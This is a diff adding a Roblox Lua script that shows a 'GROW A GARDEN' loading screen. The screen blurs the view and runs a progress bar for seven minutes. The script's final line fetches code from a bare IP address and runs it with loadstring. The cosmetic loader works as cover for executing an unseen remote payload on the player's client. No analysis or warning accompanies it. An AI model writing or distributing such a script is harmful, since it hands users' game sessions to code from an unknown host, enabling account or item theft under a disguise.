@@ -1,0 +1,90 @@
+--// Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local Lighting = game:GetService("Lighting")
+
+local player = Players.LocalPlayer
+
+--// Loader UI
+local function createLoadingScreen()
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 0
+    blur.Parent = Lighting
+    TweenService:Create(blur, TweenInfo.new(0.6), {Size = 24}):Play()
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "UniversalLoader"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = CoreGui
+
+    local frame = Instance.new("Frame")
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Size = UDim2.fromOffset(380, 170)
+    frame.Position = UDim2.fromScale(0.5, 0.5)
+    frame.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
+    frame.BackgroundTransparency = 0.08
+    frame.Parent = gui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 14)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(100, 110, 255)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.6
+    stroke.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(0.9, 0, 0.16, 0)
+    title.Position = UDim2.new(0.05, 0, 0.04, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "GROW A GARDEN"
+    title.TextScaled = true
+    title.Font = Enum.Font.GothamBold
+    title.TextColor3 = Color3.fromRGB(215, 220, 255)
+    title.Parent = frame
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.82, 0, 0.14, 0)
+    barBg.Position = UDim2.new(0.09, 0, 0.45, 0)
+    barBg.BackgroundColor3 = Color3.fromRGB(44, 44, 54)
+    barBg.Parent = frame
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 8)
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(115, 120, 255)
+    bar.Parent = barBg
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)
+
+    local percent = Instance.new("TextLabel")
+    percent.Size = UDim2.new(0.9, 0, 0.12, 0)
+    percent.Position = UDim2.new(0.05, 0, 0.62, 0)
+    percent.BackgroundTransparency = 1
+    percent.Text = "0%"
+    percent.TextScaled = true
+    percent.Font = Enum.Font.Gotham
+    percent.TextColor3 = Color3.fromRGB(200,200,255)
+    percent.Parent = frame
+
+    task.spawn(function()
+        local start = tick()
+        local duration = 420
+        while tick() - start < duration and gui.Parent do
+            local progress = (tick()-start)/duration
+            bar.Size = UDim2.new(progress,0,1,0)
+            percent.Text = math.floor(progress*100).."%"
+            task.wait(0.1)
+        end
+        bar.Size = UDim2.new(1,0,1,0)
+        percent.Text = "100%"
+        task.wait(1)
+        gui:Destroy()
+        blur:Destroy()
+    end)
+end
+
+-- show loader & run script
+createLoadingScreen()
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
